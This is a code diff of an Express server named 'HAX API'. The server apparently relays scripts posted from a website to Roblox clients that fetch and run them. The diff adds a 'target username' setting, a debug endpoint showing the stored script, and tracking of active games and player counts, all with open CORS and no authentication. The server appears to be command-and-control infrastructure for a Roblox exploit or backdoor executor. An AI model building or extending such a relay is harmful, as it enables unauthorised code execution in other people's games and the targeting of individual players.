@@ -1,14 +1,11 @@
 const express = require('express');
 const app = express();
 
-// Enable CORS
 app.use((req, res, next) => {
     res.header('Access-Control-Allow-Origin', '*');
     res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
     res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
-    if (req.method === 'OPTIONS') {
-        return res.sendStatus(200);
-    }
+    if (req.method === 'OPTIONS') return res.sendStatus(200);
     next();
 });
 
@@ -19,8 +16,8 @@ app.use(express.urlencoded({ extended: true }));
 let latestScript = "";
 let gamesData = [];
 let globalPlayers = 0;
+let targetUsername = ""; // 👈 new
 
-// Error handling
 app.use((err, req, res, next) => {
     console.error('Error:', err.message);
     res.status(500).json({ error: 'Internal server error' });
@@ -32,29 +29,37 @@ app.get('/api/test', (req, res) => {
         status: 'online', 
         games: gamesData.length,
         players: globalPlayers,
+        storedScript: latestScript ? 'yes' : 'no',
+        targetUser: targetUsername,
         timestamp: Date.now()
     });
+});
+
+app.get('/api/debug/script', (req, res) => {
+    res.type('text/plain').send(latestScript || '(empty)');
 });
 
 // Website POSTs script
 app.post('/api/execute', (req, res) => {
     try {
         latestScript = req.body || "";
-        console.log('Script received:', latestScript ? latestScript.substring(0, 50) + '...' : 'empty');
+        console.log('✅ Script stored, length:', latestScript.length);
         res.send('Script stored');
     } catch (e) {
-        console.error('Execute error:', e);
+        console.error('❌ Execute error:', e);
         res.status(500).send('Error storing script');
     }
 });
 
-// Roblox GETs script
+// Roblox GETs script (and clears it)
 app.get('/api/execute', (req, res) => {
     try {
-        res.send(latestScript || "");
-        latestScript = ""; // Clear after sending
+        const script = latestScript;
+        console.log('📤 Script retrieved, length:', script.length);
+        res.send(script);
+        latestScript = "";
     } catch (e) {
-        console.error('Execute get error:', e);
+        console.error('❌ Execute get error:', e);
         res.status(500).send('');
     }
 });
@@ -62,25 +67,18 @@ app.get('/api/execute', (req, res) => {
 // Roblox POSTs game data
 app.post('/api/games/update', (req, res) => {
     try {
-        console.log('Game data received');
-        
         let data;
         if (typeof req.body === 'string') {
-            try {
-                data = JSON.parse(req.body);
-            } catch {
-                data = { games: [], globalPlayers: 0 };
-            }
+            try { data = JSON.parse(req.body); } catch { data = { games: [], globalPlayers: 0 }; }
         } else {
             data = req.body || { games: [], globalPlayers: 0 };
         }
         
-        // Only store games with players > 0
         const allGames = data.games || [];
-        gamesData = allGames.filter(game => parseInt(game.players) > 0);
+        gamesData = allGames.filter(g => parseInt(g.players) > 0);
         globalPlayers = data.globalPlayers || 0;
         
-        console.log('Active games:', gamesData.length, 'Total players:', globalPlayers);
+        console.log('📊 Games updated, active:', gamesData.length, 'players:', globalPlayers);
         res.status(200).send('OK');
     } catch (e) {
         console.error('Error updating games:', e);
@@ -88,30 +86,34 @@ app.post('/api/games/update', (req, res) => {
     }
 });
 
-// Website GETs game data
 app.get('/api/games', (req, res) => {
+    res.json({ total: gamesData.length, players: globalPlayers, games: gamesData });
+});
+
+// 👇 NEW: Settings endpoints
+app.post('/api/setuser', (req, res) => {
     try {
-        res.json({
-            total: gamesData.length,
-            players: globalPlayers || 0,
-            games: gamesData
-        });
+        targetUsername = req.body || "";
+        console.log('🎯 Target username set to:', targetUsername);
+        res.send('OK');
     } catch (e) {
-        res.json({ total: 0, players: 0, games: [] });
+        console.error('Error setting user:', e);
+        res.status(500).send('Error');
     }
 });
 
-// Health check
+app.get('/api/getuser', (req, res) => {
+    res.send(targetUsername);
+});
+
 app.get('/', (req, res) => {
     res.send('HAX API Running - ' + new Date().toISOString());
 });
 
-// Handle 404
 app.use((req, res) => {
     res.status(404).json({ error: 'Not found' });
 });
 
-// Handle uncaught exceptions
 process.on('uncaughtException', (err) => {
     console.error('Uncaught Exception:', err);
 });
@@ -122,6 +124,5 @@ process.on('unhandledRejection', (err) => {
 
 const port = process.env.PORT || 3000;
 app.listen(port, () => {
-    console.log(`HAX Server running on port ${port}`);
-    console.log(`API URL: https://hax-api-xdi2.onrender.com`);
+    console.log(`🚀 HAX Server running on port ${port}`);
 });
